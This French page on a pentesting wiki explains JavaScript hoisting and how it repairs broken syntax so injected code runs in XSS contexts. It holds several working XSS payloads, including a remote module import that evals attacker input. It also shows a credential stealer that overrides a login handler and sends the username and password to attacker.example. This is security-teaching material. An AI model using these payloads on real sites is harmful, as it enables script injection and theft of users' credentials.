# JS Hoisting

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

Dans le langage JavaScript, un mécanisme appelé **Hoisting** désigne le fait que les déclarations de variables, fonctions, classes ou imports sont conceptuellement remontées au début de leur portée avant l'exécution du code. Ce processus est effectué automatiquement par le moteur JavaScript, qui parcourt le script en plusieurs passes.

Lors de la première passe, le moteur analyse le code pour vérifier l'absence d'erreurs de syntaxe et le transforme en un arbre syntaxique abstrait. Cette phase inclut le hoisting, un processus où certaines déclarations sont déplacées en haut du contexte d'exécution. Si la phase d'analyse est réussie, indiquant qu'il n'y a pas d'erreurs de syntaxe, l'exécution du script peut se poursuivre.

Il est crucial de comprendre que :

1. Le script doit être exempt d'erreurs de syntaxe pour que l'exécution ait lieu. Les règles de syntaxe doivent être strictement respectées.
2. Le placement du code dans le script affecte l'exécution à cause du hoisting, bien que le code exécuté puisse différer de sa représentation textuelle.

#### Types de Hoisting

D'après MDN, il existe quatre types distincts de hoisting en JavaScript :

1. **Value Hoisting** : permet d'utiliser la valeur d'une variable dans sa portée avant sa ligne de déclaration.
2. **Declaration Hoisting** : autorise la référence à une variable dans sa portée avant sa déclaration sans provoquer une `ReferenceError`, mais la valeur de la variable sera `undefined`.
3. Ce type modifie le comportement au sein de sa portée parce que la déclaration de la variable est traitée avant sa ligne de déclaration effective.
4. Les effets de bord de la déclaration se produisent avant l'évaluation du reste du code qui la contient.

En détail, les déclarations de fonctions présentent le comportement de hoisting de type 1. Le mot-clé `var` démontre le comportement de type 2. Les déclarations lexicales, qui incluent `let`, `const` et `class`, présentent le comportement de type 3. Enfin, les instructions `import` sont particulières en ce qu'elles sont hoistées avec les comportements de type 1 et de type 4.

## Scénarios

Ainsi, si vous avez un scénario où vous pouvez **Inject JS code after an undeclared object**, vous pouvez **fix the syntax** en le déclarant (afin que votre code soit exécuté au lieu de lever une erreur) :
```javascript
// The function vulnerableFunction is not defined
vulnerableFunction('test', '<INJECTION>');
// You can define it in your injection to execute JS
//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
'-alert(1)-''); function vulnerableFunction(a,b){return 1};

//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
test'); function vulnerableFunction(a,b){ return 1 };alert(1)
```

```javascript
// If a variable is not defined, you could define it in the injection
// In the following example var a is not defined
function myFunction(a,b){
return 1
};
myFunction(a, '<INJECTION>')

//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
test'); var a = 1; alert(1);
```

```javascript
// If an undeclared class is used, you cannot declare it AFTER being used
var variable = new unexploitableClass();
<INJECTION>
// But you can actually declare it as a function, being able to fix the syntax with something like:
function unexploitableClass() {
return 1;
}
alert(1);
```

```javascript
// Properties are not hoisted
// So the following examples where the 'cookie' attribute doesn´t exist
// cannot be fixed if you can only inject after that code:
test.cookie("leo", "INJECTION")
test[("cookie", "injection")]
```
## Plus de scénarios
```javascript
// Undeclared var accessing to an undeclared method
x.y(1,INJECTION)
// You can inject
alert(1));function x(){}//
// And execute the allert with (the alert is resolved before it's detected that the "y" is undefined
x.y(1,alert(1));function x(){}//)
```

```javascript
// Undeclared var accessing 2 nested undeclared method
x.y.z(1,INJECTION)
// You can inject
");import {x} from "https://example.com/module.js"//
// It will be executed
x.y.z("alert(1)");import {x} from "https://example.com/module.js"//")


// The imported module:
// module.js
var x = {
y: {
z: function(param) {
eval(param);
}
}
};

export { x };
```

```javascript
// In this final scenario from https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/
// It was injected the: let config;`-alert(1)`//`
// With the goal of making in the block the var config be empty, so the return is not executed
// And the same injection was replicated in the body URL to execute an alert

try {
if (config) {
return
}
// TODO handle missing config for: https://try-to-catch.glitch.me/"+`
let config
;`-alert(1)` //`+"
} catch {
fetch("/error", {
method: "POST",
body: {
url:
"https://try-to-catch.glitch.me/" +
`
let config;` -
alert(1) -
`//` +
"",
},
})
}
trigger()
```
### Hoisting pour contourner la gestion des exceptions

Lorsque le sink est enveloppé dans un `try { x.y(...) } catch { ... }`, **ReferenceError** arrêtera l'exécution avant que votre payload ne s'exécute. Vous pouvez pré-déclarer l'identifiant manquant pour que l'appel ne soit pas interrompu et que votre expression injectée s'exécute en premier :
```javascript
// Original sink (x and y are undefined, but you control INJECT)
x.y(1,INJECT)

// Payload (ch4n3 2023) – hoist x so the call is parsed; use the first argument position for code exec
prompt()) ; function x(){} //
```
`function x(){}` is hoisted before evaluation, so the parser no longer throws on `x.y(...)`; `prompt()` executes before `y` is resolved, then a `TypeError` is thrown after your code has run.

### Anticiper les déclarations ultérieures en verrouillant un nom avec const

Si vous pouvez exécuter du code avant qu'une `function foo(){...}` au niveau global ne soit parsée, déclarer une liaison lexicale portant le même nom (par ex., `const foo = ...`) empêchera la déclaration de fonction ultérieure de réaffecter cet identifiant. Cela peut être abusé en RXSS pour détourner des gestionnaires critiques définis plus tard dans la page :
```javascript
// Malicious code runs first (e.g., earlier inline <script>)
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value)
const user = Trim(FormInput.InputUtente.value)
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd))
}

// Later, the legitimate page tries to declare:
function DoLogin(){ /* ... */ } // cannot override the existing const binding
```
Remarques
- Cela repose sur l'ordre d'exécution et la portée globale (top-level).
- Si votre payload est exécuté dans `eval()`, rappelez-vous que `const/let` à l'intérieur de `eval` sont block-scoped et ne créeront pas de global bindings. Injectez un nouvel élément `<script>` contenant le code pour établir un vrai `const` global.

### Dynamic import() avec des spécificateurs contrôlés par l'utilisateur

Les applications server-side rendered transmettent parfois l'entrée utilisateur vers `import()` pour lazy-load des composants. Si un loader tel que `import-in-the-middle` est présent, des modules wrapper sont générés à partir du specifier. L'évaluation hoisted des imports récupère et exécute le module contrôlé par l'attaquant avant l'exécution des lignes suivantes, permettant une RCE dans des contextes SSR (voir CVE-2023-38704).

### Outils

Les scanners modernes ont commencé à ajouter des payloads explicites de hoisting. **KNOXSS v3.6.5** liste "JS Injection with Single Quotes Fixing ReferenceError - Object Hoisting" et "Hoisting Override" comme cas de test ; l'exécuter contre des contextes RXSS qui déclenchent `ReferenceError`/`TypeError` met rapidement en évidence des candidats de gadgets basés sur hoisting.

## Références

- [https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios](https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios)
- [https://developer.mozilla.org/en-US/docs/Glossary/Hoisting](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting)
- [https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/](https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [XSS Exception Bypass using Hoisting (ch4n3, 2023)](https://new-blog.ch4n3.kr/xss-exception-bypass-using-hoisting/)
- [KNOXSS coverage – hoisting override cases](https://knoxss.pro/?page_id=766)

{{#include ../../banners/hacktricks-training.md}}
